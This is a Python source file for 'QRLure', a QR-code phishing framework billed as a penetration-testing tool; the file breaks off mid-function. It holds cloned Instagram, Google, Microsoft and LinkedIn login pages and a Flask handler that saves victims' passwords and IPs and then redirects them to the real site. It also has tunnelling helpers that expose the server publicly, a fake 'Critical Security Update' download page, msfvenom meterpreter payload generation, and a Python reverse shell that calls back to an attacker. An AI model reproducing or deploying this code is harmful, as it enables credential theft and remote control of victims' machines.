#!/usr/bin/env python3
"""
QRLure v2.1 - Instagram Edition
QR Code Phishing & Payload Delivery Framework
Authorized Penetration Testing Tool

Attack Chain:
  QR Code (URL) -> Target scans -> Lands on your controlled page
    Mode HARVEST: Fake Instagram login page captures credentials
    Mode PAYLOAD: Serves reverse shell (user must execute it)

Tunnel options (auto-detected):
  1. jprq     - Pure Python, no signup needed:  pip install jprq
  2. ngrok    - Fast but requires auth token:   ngrok config add-authtoken <token>
  3. SSH      - localhost.run (no install):     ssh -R 80:localhost:PORT ssh.localhost.run
  4. Direct   - Use local IP if same network, or public IP

Usage:
  # Instagram credential harvesting (SIGN UP page - collects email, full name, username, password)
  python3 qrlure_instagram.py --mode harvest --template instagram

  # Instagram credential harvesting (LOG IN page - collects email/username and password)
  python3 qrlure_instagram.py --mode harvest --template instagram_login

  # Payload delivery (Windows reverse shell)
  python3 qrlure_instagram.py --mode payload --target-os windows --lport 4444

  # Force specific tunnel
  python3 qrlure_instagram.py --mode harvest --tunnel jprq
"""

import os, sys, time, json, threading, argparse, subprocess, socket, logging, signal
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse

# --- Dependencies ---
try:
    import qrcode
except ImportError:
    print("[!] pip install qrcode[pil]")
    sys.exit(1)

try:
    from flask import Flask, request, render_template_string, send_file, redirect
except ImportError:
    print("[!] pip install flask")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("[!] pip install requests")
    sys.exit(1)

# ============================================================
# CONFIGURATION
# ============================================================
LOG_FILE = "qrlure_output.log"
CAPTURED_CREDS_FILE = "captured_credentials.json"
QR_CODE_OUTPUT = "qrlure_qrcode.png"
LOCAL_PORT = 8080
NGROK_REGION = "us"

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(message)s",
    datefmt="%H:%M:%S",
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler()]
)
log = logging.getLogger(__name__)

# ============================================================
# FLASK APP
# ============================================================
app = Flask(__name__)

LOGIN_TEMPLATES = {
    "instagram": {
        "title": "Instagram Sign-Up",
        "html": """<!DOCTYPE html><html lang="en"><head><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>Instagram</title><style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column;padding:20px}
.card{max-width:350px;width:100%;padding:40px 40px 20px;background:#fff;border:1px solid #dbdbdb;border-radius:1px;margin-bottom:10px}
.logo{text-align:center;margin-bottom:28px}
.logo svg{height:51px;display:block;margin:0 auto}
.tagline{text-align:center;color:#8e8e8e;font-size:17px;font-weight:600;line-height:20px;margin:0 0 16px;word-wrap:break-word}
.input-group{position:relative;margin-bottom:6px}
input{width:100%;padding:9px 0 7px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;color:#262626;height:36px;outline:none}
input:focus{border-color:#a8a8a8}
input::placeholder{color:#8e8e8e;font-size:12px}
button{width:100%;padding:5px 9px;background:#0095f6;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;height:30px;margin-top:8px}
button:hover{background:#1877f2}
.or-divider{display:flex;align-items:center;margin:18px 0}
.or-line{flex:1;height:1px;background:#dbdbdb}
.or-text{color:#8e8e8e;font-size:13px;font-weight:600;margin:0 18px}
.fb-login{text-align:center;margin-top:8px}
.fb-login a{color:#385185;font-size:14px;font-weight:600;text-decoration:none;display:inline-flex;align-items:center;gap:8px;justify-content:center}
.forgot-pw{text-align:center;margin-top:12px}
.forgot-pw a{color:#00376b;font-size:12px;text-decoration:none}
.signup-box{max-width:350px;width:100%;padding:10px 0;background:#fff;border:1px solid #dbdbdb;border-radius:1px;text-align:center;font-size:14px;color:#262626}
.signup-box a{color:#0095f6;font-weight:600;text-decoration:none}
.get-app{text-align:center;margin-top:10px}
.get-app p{font-size:14px;margin-bottom:10px}
.app-links{display:flex;justify-content:center;gap:8px}
.footer{margin-top:60px;text-align:center;font-size:12px;color:#8e8e8e;max-width:350px;line-height:18px}
.footer a{color:#8e8e8e;text-decoration:none;margin:0 8px 0 0}
</style></head><body>
<div class="card">
<div class="logo">
<svg viewBox="0 0 175 39" xmlns="http://www.w3.org/2000/svg"><path d="M16.6 0c-1.82 0-2 .04-2.7.12-2.94.32-4.92 1.06-6.6 2.6C5.8 4.22 5 6.2 4.68 9.14 4.6 9.84 4.57 10.02 4.57 11.82v15.06c0 1.8.03 1.98.11 2.68.32 2.94 1.06 4.92 2.6 6.6 1.56 1.66 3.54 2.46 6.48 2.78.7.08.88.11 2.68.11h15.06c1.8 0 1.98-.03 2.68-.11 2.94-.32 4.92-1.06 6.6-2.6 1.66-1.56 2.46-3.54 2.78-6.48.08-.7.11-.88.11-2.68V11.82c0-1.8-.03-1.98-.11-2.68-.32-2.94-1.06-4.92-2.6-6.6C34.86 1.18 32.88.38 29.94.06 29.24-.02 29.06-.05 27.26-.05H16.6zm0 3.6h10.78c1.76 0 1.92.04 2.58.1 2.47.27 3.82 1.07 4.72 2 1.08 1.08 1.76 2.55 2 4.66.04.7.06.85.06 2.6v15.1c0 1.72-.02 1.88-.06 2.58-.22 2.13-.9 3.6-2 4.67-.9.94-2.25 1.74-4.72 2-.66.06-.82.1-2.58.1H16.6c-1.76 0-1.92-.04-2.58-.1-2.47-.27-3.82-1.07-4.72-2-1.08-1.08-1.76-2.55-2-4.66-.04-.7-.06-.85-.06-2.6V10.94c0-1.72.02-1.88.06-2.58.22-2.13.9-3.6 2-4.67.9-.94 2.25-1.74 4.72-2 .66-.06.82-.1 2.58-.1z" fill="#262626"/><path d="M21.94 9.45a10.24 10.24 0 100 20.48 10.24 10.24 0 000-20.48zm0 3.6a6.64 6.64 0 110 13.28 6.64 6.64 0 010-13.28z" fill="#262626"/><circle cx="33.3" cy="8.15" r="2.4" fill="#262626"/></svg>
</div>
<div class="tagline">Sign up to see photos and videos from your friends.</div>
<form method="POST" action="/login">
<div class="input-group"><input type="text" name="email" placeholder="Mobile number or email" required></div>
<div class="input-group"><input type="text" name="fullname" placeholder="Full name" required></div>
<div class="input-group"><input type="text" name="username" placeholder="Username" required></div>
<div class="input-group"><input type="password" name="password" placeholder="Password" required></div>
<button type="submit" name="action" value="signup">Sign up</button>
</form>
<div class="or-divider"><div class="or-line"></div><div class="or-text">OR</div><div class="or-line"></div></div>
<div class="fb-login"><a href="#"><svg viewBox="0 0 16 16" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049C16 3.603 12.418 0 8 0S0 3.603 0 8.049c0 4.017 2.926 7.347 6.75 7.951v-5.625H4.718V8.049H6.75V6.276c0-2.017 1.195-3.13 3.022-3.13.874 0 1.79.157 1.79.157v1.98h-1.009c-.994 0-1.303.621-1.303 1.258v1.51h2.219l-.355 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z" fill="#385185"/></svg> Log in with Facebook</a></div>
<div class="forgot-pw"><a href="#">Forgot password?</a></div>
</div>
<div class="signup-box">Have an account? <a href="#">Log in</a></div>
<div class="get-app"><p>Get the app.</p><div class="app-links"><a href="#"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40' width='135' height='40'%3E%3Crect width='135' height='40' rx='5' fill='%23000'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='central' text-anchor='middle' fill='%23fff' font-size='10' font-family='Arial'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play"></a><a href="#"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 110 40' width='110' height='40'%3E%3Crect width='110' height='40' rx='5' fill='%23000'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='central' text-anchor='middle' fill='%23fff' font-size='9' font-family='Arial'%3EMicrosoft%3C/text%3E%3C/svg%3E" alt="App Store"></a></div></div>
<div class="footer"><a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Top Accounts</a><a href="#">Hashtags</a><a href="#">Locations</a><a href="#">Instagram Lite</a><br><br>English &#9660; &copy; 2026 Instagram from Meta</div>
</body></html>"""
    },
    "instagram_login": {
        "title": "Instagram Log In",
        "html": """<!DOCTYPE html><html lang="en"><head><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>Instagram</title><style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
body{background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh;flex-direction:column;padding:20px}
.card{max-width:350px;width:100%;padding:40px 40px 20px;background:#fff;border:1px solid #dbdbdb;border-radius:1px;margin-bottom:10px}
.logo{text-align:center;margin-bottom:28px}
.logo svg{height:51px;display:block;margin:0 auto}
.input-group{position:relative;margin-bottom:6px}
input{width:100%;padding:9px 0 7px 8px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;color:#262626;height:36px;outline:none}
input:focus{border-color:#a8a8a8}
input::placeholder{color:#8e8e8e;font-size:12px}
button{width:100%;padding:5px 9px;background:#0095f6;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;height:30px;margin-top:8px}
button:hover{background:#1877f2}
.or-divider{display:flex;align-items:center;margin:18px 0}
.or-line{flex:1;height:1px;background:#dbdbdb}
.or-text{color:#8e8e8e;font-size:13px;font-weight:600;margin:0 18px}
.fb-login{text-align:center;margin-bottom:8px}
.fb-login a{color:#385185;font-size:14px;font-weight:600;text-decoration:none;display:inline-flex;align-items:center;gap:8px;justify-content:center}
.forgot-pw{text-align:center;margin-top:12px;margin-bottom:20px}
.forgot-pw a{color:#00376b;font-size:12px;text-decoration:none}
.signup-box{max-width:350px;width:100%;padding:25px 0;background:#fff;border:1px solid #dbdbdb;border-radius:1px;text-align:center;font-size:14px;color:#262626}
.signup-box a{color:#0095f6;font-weight:600;text-decoration:none}
.get-app{text-align:center;margin-top:10px}
.get-app p{font-size:14px;margin-bottom:10px}
.app-links{display:flex;justify-content:center;gap:8px}
.footer{margin-top:60px;text-align:center;font-size:12px;color:#8e8e8e;max-width:350px;line-height:18px}
.footer a{color:#8e8e8e;text-decoration:none;margin:0 8px 0 0}
</style></head><body>
<div class="card">
<div class="logo">
<svg viewBox="0 0 175 39" xmlns="http://www.w3.org/2000/svg"><path d="M16.6 0c-1.82 0-2 .04-2.7.12-2.94.32-4.92 1.06-6.6 2.6C5.8 4.22 5 6.2 4.68 9.14 4.6 9.84 4.57 10.02 4.57 11.82v15.06c0 1.8.03 1.98.11 2.68.32 2.94 1.06 4.92 2.6 6.6 1.56 1.66 3.54 2.46 6.48 2.78.7.08.88.11 2.68.11h15.06c1.8 0 1.98-.03 2.68-.11 2.94-.32 4.92-1.06 6.6-2.6 1.66-1.56 2.46-3.54 2.78-6.48.08-.7.11-.88.11-2.68V11.82c0-1.8-.03-1.98-.11-2.68-.32-2.94-1.06-4.92-2.6-6.6C34.86 1.18 32.88.38 29.94.06 29.24-.02 29.06-.05 27.26-.05H16.6zm0 3.6h10.78c1.76 0 1.92.04 2.58.1 2.47.27 3.82 1.07 4.72 2 1.08 1.08 1.76 2.55 2 4.66.04.7.06.85.06 2.6v15.1c0 1.72-.02 1.88-.06 2.58-.22 2.13-.9 3.6-2 4.67-.9.94-2.25 1.74-4.72 2-.66.06-.82.1-2.58.1H16.6c-1.76 0-1.92-.04-2.58-.1-2.47-.27-3.82-1.07-4.72-2-1.08-1.08-1.76-2.55-2-4.66-.04-.7-.06-.85-.06-2.6V10.94c0-1.72.02-1.88.06-2.58.22-2.13.9-3.6 2-4.67.9-.94 2.25-1.74 4.72-2 .66-.06.82-.1 2.58-.1z" fill="#262626"/><path d="M21.94 9.45a10.24 10.24 0 100 20.48 10.24 10.24 0 000-20.48zm0 3.6a6.64 6.64 0 110 13.28 6.64 6.64 0 010-13.28z" fill="#262626"/><circle cx="33.3" cy="8.15" r="2.4" fill="#262626"/></svg>
</div>
<form method="POST" action="/login">
<div class="input-group"><input type="text" name="email" placeholder="Phone number, username, or email" required></div>
<div class="input-group"><input type="password" name="password" placeholder="Password" required></div>
<button type="submit" name="action" value="login">Log in</button>
</form>
<div class="or-divider"><div class="or-line"></div><div class="or-text">OR</div><div class="or-line"></div></div>
<div class="fb-login"><a href="#"><svg viewBox="0 0 16 16" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M16 8.049C16 3.603 12.418 0 8 0S0 3.603 0 8.049c0 4.017 2.926 7.347 6.75 7.951v-5.625H4.718V8.049H6.75V6.276c0-2.017 1.195-3.13 3.022-3.13.874 0 1.79.157 1.79.157v1.98h-1.009c-.994 0-1.303.621-1.303 1.258v1.51h2.219l-.355 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z" fill="#385185"/></svg> Log in with Facebook</a></div>
<div class="forgot-pw"><a href="#">Forgot password?</a></div>
</div>
<div class="signup-box">Don't have an account? <a href="#">Sign up</a></div>
<div class="get-app"><p>Get the app.</p><div class="app-links"><a href="#"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40' width='135' height='40'%3E%3Crect width='135' height='40' rx='5' fill='%23000'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='central' text-anchor='middle' fill='%23fff' font-size='10' font-family='Arial'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play"></a><a href="#"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 110 40' width='110' height='40'%3E%3Crect width='110' height='40' rx='5' fill='%23000'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='central' text-anchor='middle' fill='%23fff' font-size='9' font-family='Arial'%3EMicrosoft%3C/text%3E%3C/svg%3E" alt="App Store"></a></div></div>
<div class="footer"><a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Top Accounts</a><a href="#">Hashtags</a><a href="#">Locations</a><a href="#">Instagram Lite</a><br><br>English &#9660; &copy; 2026 Instagram from Meta</div>
</body></html>"""
    },
    "google": {
        "title": "Google Sign-In",
        "html": """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><title>Sign in - Google Accounts</title><style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Google Sans',Arial,sans-serif}
body{background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{max-width:400px;width:100%;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
.logo{text-align:center;margin-bottom:20px}
h1{font-size:24px;text-align:center;margin-bottom:8px;color:#202124}
.sub{text-align:center;color:#5f6368;font-size:14px;margin-bottom:30px}
input{width:100%;padding:12px 14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:15px}
input:focus{outline:none;border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,0.3)}
button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer}
button:hover{background:#1557b0}
</style></head><body>
<div class="card">
<div class="logo"><svg width="75" height="75" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.54 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.97 23.97 0 0 0 0 24c0 3.77.87 7.34 2.56 10.78l7.98-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg></div>
<h1>Sign in</h1><p class="sub">Use your Google Account</p>
<form method="POST" action="/login"><input type="text" name="email" placeholder="Email or phone" required><input type="password" name="password" placeholder="Password" required><button type="submit">Next</button></form></div></body></html>"""
    },
    "microsoft": {
        "title": "Microsoft Sign-In",
        "html": """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><title>Sign in to Microsoft</title><style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Arial,sans-serif}
body{background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{max-width:440px;width:100%;padding:44px;background:#fff;box-shadow:0 2px 6px rgba(0,0,0,0.2)}
h1{font-size:24px;font-weight:600;margin-bottom:12px;color:#1b1b1b}
.sub{color:#666;font-size:15px;margin-bottom:24px}
input{width:100%;padding:8px 0;border:none;border-bottom:1px solid #333;font-size:15px;margin-bottom:20px;outline:none}
input:focus{border-bottom:2px solid #0067b8}
.btn-row{display:flex;justify-content:flex-end;margin-top:20px}
button{background:#0067b8;color:#fff;border:none;padding:8px 32px;font-size:15px;cursor:pointer}
</style></head><body>
<div class="card"><h1>Sign in</h1><p class="sub">to continue to Microsoft services</p>
<form method="POST" action="/login"><input type="text" name="email" placeholder="Email, phone, or Skype" required><input type="password" name="password" placeholder="Password" required><div class="btn-row"><button type="submit">Sign in</button></div></form></div></body></html>"""
    },
    "linkedin": {
        "title": "LinkedIn Sign-In",
        "html": """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><title>LinkedIn Login</title><style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{background:#f3f2ef;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{max-width:400px;width:100%;padding:40px;background:#fff;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.15)}
.logo{color:#0a66c2;font-size:32px;font-weight:700;margin-bottom:20px}
h1{font-size:28px;margin-bottom:6px}
.sub{color:#666;font-size:14px;margin-bottom:24px}
input{width:100%;padding:14px;border:1px solid #ccc;border-radius:4px;font-size:15px;margin-bottom:12px}
input:focus{outline:none;border-color:#0a66c2}
button{width:100%;padding:14px;background:#0a66c2;color:#fff;border:none;border-radius:28px;font-size:16px;font-weight:600;cursor:pointer}
button:hover{background:#004182}
</style></head><body>
<div class="card"><div class="logo">LinkedIn</div><h1>Welcome back</h1><p class="sub">Don't miss your next opportunity</p>
<form method="POST" action="/login"><input type="text" name="email" placeholder="Email or phone" required><input type="password" name="password" placeholder="Password" required><button type="submit">Sign in</button></form></div></body></html>"""
    },
    "generic": {
        "title": "Security Verification",
        "html": """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><title>Security Verification</title><style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{background:linear-gradient(135deg,#667eea,#764ba2);display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{max-width:400px;width:100%;padding:40px;background:#fff;border-radius:12px;box-shadow:0 10px 40px rgba(0,0,0,0.3)}
h1{font-size:22px;text-align:center;margin-bottom:6px;color:#333}
.sub{text-align:center;color:#888;font-size:14px;margin-bottom:25px}
input{width:100%;padding:12px 16px;border:2px solid #e0e0e0;border-radius:8px;font-size:15px;margin-bottom:12px}
input:focus{outline:none;border-color:#667eea}
button{width:100%;padding:12px;background:#667eea;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
</style></head><body>
<div class="card"><h1>Security Verification</h1><p class="sub">Please verify your identity to continue</p>
<form method="POST" action="/login"><input type="text" name="email" placeholder="Email Address" required><input type="password" name="password" placeholder="Password" required><button type="submit">Verify & Continue</button></form></div></body></html>"""
    }
}

PAYLOAD_PAGE = """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"><title>Update Required</title><style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{max-width:400px;width:100%;padding:40px;background:#fff;border-radius:12px;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,0.1)}
.icon{font-size:56px;margin-bottom:15px}
h1{font-size:22px;color:#333;margin-bottom:8px}
p{color:#777;font-size:14px;margin-bottom:25px;line-height:1.5}
.btn{display:inline-block;padding:14px 40px;background:#0067b8;color:#fff;text-decoration:none;border-radius:6px;font-size:16px;font-weight:600}
.btn:hover{background:#004e8c}
.small{color:#999;font-size:11px;margin-top:15px}
</style></head><body>
<div class="card"><div class="icon">&#9881;</div><h1>Critical Security Update</h1><p>Your system requires an important security update. Please download and run the update.</p><a href="/payload" class="btn">Download Update</a><p class="small">Security patch {{ date }}</p></div></body></html>"""

captured_creds = []
current_mode = "harvest"
selected_template = "instagram"
payload_path = None
payload_lhost = None
payload_lport = 4444

@app.route("/")
def index():
    if current_mode == "harvest":
        return render_template_string(LOGIN_TEMPLATES[selected_template]["html"])
    else:
        return render_template_string(PAYLOAD_PAGE, date=datetime.now().strftime("KB%m%Y"))

@app.route("/login", methods=["POST"])
def capture_login():
    email = request.form.get("email", "")
    password = request.form.get("password", "")
    fullname = request.form.get("fullname", "")
    username = request.form.get("username", "")
    ip = request.remote_addr
    ua = request.headers.get("User-Agent", "")
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    entry = {
        "timestamp": ts,
        "ip": ip,
        "email": email,
        "password": password,
        "user_agent": ua
    }
    if fullname:
        entry["fullname"] = fullname
    if username:
        entry["username"] = username

    captured_creds.append(entry)

    with open(CAPTURED_CREDS_FILE, "w") as f:
        json.dump(captured_creds, f, indent=2)

    log.info(f"[+] CREDENTIALS CAPTURED | IP: {ip} | Email: {email} | Pass: {password}")
    print(f"\n{'='*60}")
    print(f"  >>> HARVESTED INSTAGRAM CREDENTIALS <<<")
    print(f"  Timestamp:  {ts}")
    print(f"  IP:         {ip}")
    print(f"  Email:      {email}")
    print(f"  Password:   {password}")
    if fullname:
        print(f"  Full Name:  {fullname}")
    if username:
        print(f"  Username:   {username}")
    print(f"  User-Agent: {ua[:80]}")
    print(f"{'='*60}\n")

    # Redirect to real Instagram
    return redirect("https://www.instagram.com")

@app.route("/payload")
def download_payload():
    if payload_path and os.path.exists(payload_path):
        log.info(f"[+] Serving payload to {request.remote_addr}")
        return send_file(payload_path, as_attachment=True, download_name=os.path.basename(payload_path))
    return "Update not available", 404

@app.route("/track")
def track_scan():
    ip = request.remote_addr
    ua = request.headers.get("User-Agent", "")
    log.info(f"[*] QR SCAN detected from {ip} | {ua[:60]}")
    # Return a 1x1 transparent GIF pixel
    return b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b', 200, {'Content-Type': 'image/gif'}

# ============================================================
# QR CODE - FIXED VERSION
# ============================================================
def generate_qr_code(data: str, output_path: str = QR_CODE_OUTPUT):
    """
    Generate a scannable QR code with proper quiet zone borders.
    
    Fixes:
    - version=None so make(fit=True) picks the SMALLEST version for the data
      (version=5 forced a 37x37 matrix even for short URLs, making ASCII too wide)
    - PNG uses border=4 (spec minimum) for proper scanning
    - ASCII preview uses border=1 to fit terminal width without wrapping
    """
    # --- PNG image (for actual scanning) with proper spec-compliant border ---
    qr = qrcode.QRCode(
        version=None,                         # Auto-select smallest version
        error_correction=qrcode.constants.ERROR_CORRECT_H,  # 30% recovery
        box_size=10,
        border=4                              # Spec minimum = 4 modules
    )
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    img.save(output_path)
    log.info(f"[+] QR code saved: {output_path}")

    # --- ASCII preview (terminal display) with smaller border to avoid wrapping ---
    print(f"\n[*] Scanning URL: {data}")
    print(f"[*] QR code image file: {output_path}")

    qr_ascii = qrcode.QRCode(
        version=None,
        error_correction=qrcode.constants.ERROR_CORRECT_H,
        border=1  # Smaller border so ASCII fits in narrow terminals
    )
    qr_ascii.add_data(data)
    qr_ascii.make(fit=True)
    print("\n[*] QR Code (terminal preview):")
    qr_ascii.print_ascii(invert=True)
    print()  # trailing newline

# ============================================================
# TUNNEL BACKENDS
# ============================================================
def get_local_ip() -> str:
    """Get the primary local IP address."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

def tunnel_via_jprq(port: int) -> tuple:
    """Use jprq (pure Python tunnel, no signup)"""
    log.info("[*] Trying tunnel: jprq (pip install jprq)")
    try:
        proc = subprocess.Popen(
            ["jprq", "http", str(port)],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True
        )
        for _ in range(30):
            line = proc.stdout.readline()
            if line:
                print(f"  jprq: {line.strip()}")
            if "https://" in line and ".jprq." in line:
                url = line.strip().split("https://")[-1].split()[0]
                url = "https://" + url
                return url, proc
            time.sleep(0.5)
        return None, proc
    except FileNotFoundError:
        return None, None

def tunnel_via_ngrok(port: int) -> tuple:
    """Use ngrok tunnel."""
    log.info("[*] Trying tunnel: ngrok")
    try:
        proc = subprocess.Popen(
            ["ngrok", "http", str(port), "--region", NGROK_REGION, "--log=stdout"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        for i in range(15):
            try:
                r = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=2)
                if r.status_code == 200:
                    for t in r.json().get("tunnels", []):
                        url = t.get("public_url", "")
                        if url.startswith("https"):
                            return url, proc
            except:
                pass
            time.sleep(1)
        proc.terminate()
        return None, None
    except FileNotFoundError:
        return None, None

def tunnel_via_ssh(port: int) -> tuple:
    """Use localhost.run (SSH-based, no install needed)."""
    log.info("[*] Trying tunnel: localhost.run (SSH)")
    try:
        proc = subprocess.Popen(
            ["ssh", "-o", "StrictHostKeyChecking=no",
             "-R", f"80:localhost:{port}", "ssh.localhost.run"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True
        )
        for _ in range(20):
            line = proc.stdout.readline()
            if line:
                print(f"  ssh: {line.strip()}")
            if "https://" in line and "localhost.run" in line:
                url = line.strip().split("https://")[-1].split()[0]
                url = "https://" + url
                return url, proc
            time.sleep(0.5)
        return None, proc
    except FileNotFoundError:
        return None, None

def setup_tunnel(port: int, method: str = "auto") -> tuple:
    """
    Establish a tunnel and return (public_url, process).
    Methods: auto, jprq, ngrok, ssh, direct
    """
    methods = []
    if method == "auto":
        methods = [
            ("jprq", tunnel_via_jprq),
            ("ngrok", tunnel_via_ngrok),
            ("ssh", tunnel_via_ssh),
        ]
    elif method == "jprq":
        methods = [("jprq", tunnel_via_jprq)]
    elif method == "ngrok":
        methods = [("ngrok", tunnel_via_ngrok)]
    elif method == "ssh":
        methods = [("ssh", tunnel_via_ssh)]
    elif method == "direct":
        methods = []
    else:
        log.warning(f"[!] Unknown tunnel method: {method}, falling back to auto")
        methods = [("jprq", tunnel_via_jprq), ("ngrok", tunnel_via_ngrok), ("ssh", tunnel_via_ssh)]

    for name, func in methods:
        log.info(f"[*] Attempting {name} tunnel...")
        result, proc = func(port)
        if result:
            log.info(f"[+] Tunnel established via {name}: {result}")
            return result, proc
        if proc:
            try: proc.terminate()
            except: pass
        log.warning(f"[-] {name} failed")

    # Fallback: direct IP
    local_ip = get_local_ip()
    log.warning(f"[!] All tunnels failed. Using direct IP: {local_ip}:{port}")
    log.warning("[!] This only works if target is on the same network!")
    return f"http://{local_ip}:{port}", None

# ============================================================
# PAYLOAD GENERATION
# ============================================================
def generate_python_reverse_shell(lhost: str, lport: int, out_file: str) -> str:
    """Generate a Python reverse shell (works on Linux/Windows/macOS)."""
    code = '''#!/usr/bin/env python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("%s",%d))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty; pty.spawn("/bin/sh")
''' % (lhost, lport)
    with open(out_file, "w") as f:
        f.write(code)
    os.chmod(out_file, 0o755)
    return out_file

def generate_payload(lhost: str, lport: int, output_dir: str = ".") -> str:
    """Try msfvenom first, fall back to Python reverse shell."""
    target_os = args.target_os
    out_file = os.path.join(output_dir, f"update.{'exe' if target_os == 'windows' else 'py'}")

    # Try msfvenom for Windows/Linux
    if target_os in ("windows", "linux"):
        fmt = "exe" if target_os == "windows" else "elf"
        ext = fmt
        out_file = os.path.join(output_dir, f"update.{ext}")

        payload_map = {
            "windows": "windows/x64/meterpreter/reverse_tcp",
            "linux": "linux/x64/meterpreter/reverse_tcp",
        }

        log.info(f"[*] Generating {target_os} payload with msfvenom...")
        cmd = [
            "msfvenom",
            "-p", payload_map[target_os],
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f", ext,
            "-o", out_file
        ]
        log.info(f"    {' '.join(cmd)}")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            if result.returncode == 0 and os.path.exists(out_file):
                log.info(f"[+] Payload: {out_file} ({os.path.getsize(out_file):,} bytes)")
                return out_file
            log.warning(f"    msfvenom failed: {result.stderr[:200]}")
        except Exception as e:
            log.warning(f"    msfvenom error: {e}")

    # Fallback: Python reverse shell
